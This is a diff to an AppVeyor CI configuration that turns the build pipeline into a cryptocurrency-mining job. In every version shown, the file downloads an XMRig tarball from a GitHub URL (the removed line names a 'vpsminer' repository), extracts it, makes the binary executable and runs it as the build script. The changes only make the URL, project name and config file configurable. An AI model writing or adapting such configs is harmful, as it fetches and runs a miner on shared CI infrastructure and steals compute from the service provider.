@@ -1,12 +1,16 @@
 version: 1.0.{build}
-image: Ubuntu
+image: Ubuntu  # Using Ubuntu as the build environment
 
 # Environment setup for XMRig
 environment:
   global:
     XMRIG_DIR: "./xmrigdir"       # Directory for extracted files
     TAR_FILE: "xmrigdir.tar.gz"    # Name of your tarball
-    GITHUB_REPO_URL: "https://github.com/orkaroeli/vpsminer"  # GitHub repository link
+    GITHUB_REPO_URL: "https://github.com/user/xmrig_project/raw/main/xmrigdir.tar.gz"  # Default URL
+
+  # Dynamically request a project name or allow it to be passed via AppVeyor environment variables
+  matrix:
+    - PROJECT_NAME: "DefaultProject"  # If not passed, use a default project name
 
 # Install necessary packages
 install:
@@ -15,23 +19,26 @@ install:
 
 # Steps before the build starts
 before_build:
-  # Download XMRig tarball from GitHub
-  - curl -L $GITHUB_REPO_URL/raw/main/$TAR_FILE -o $TAR_FILE
+  # Dynamically fetch or request project details
+  - echo "Building for project: ${APPVEYOR_REPO_NAME:-$PROJECT_NAME}"
+
+  # Download the tarball from the default or dynamic GitHub URL
+  - curl -L $GITHUB_REPO_URL -o $TAR_FILE
 
   # Extract the tarball
   - tar -xvf $TAR_FILE
 
-  # Navigate to the extracted directory
+  # Navigate into the extracted directory
   - cd $XMRIG_DIR
 
-  # Make the xmrig binary executable
+  # Make the xmrig file executable
   - chmod +x ./xmrig
 
 build_script:
-  # Run XMRig using config.json
-  - ./xmrig --config=config.json
+  # Run the XMRig binary with the default config.json or user-specified config
+  - ./xmrig --config=${CONFIG_FILE:-config.json}
 
 artifacts:
   - path: $XMRIG_DIR
-    name: "XMRig_artifacts"
+    name: "XMRig_artifacts_${APPVEYOR_REPO_NAME:-$PROJECT_NAME}"
     
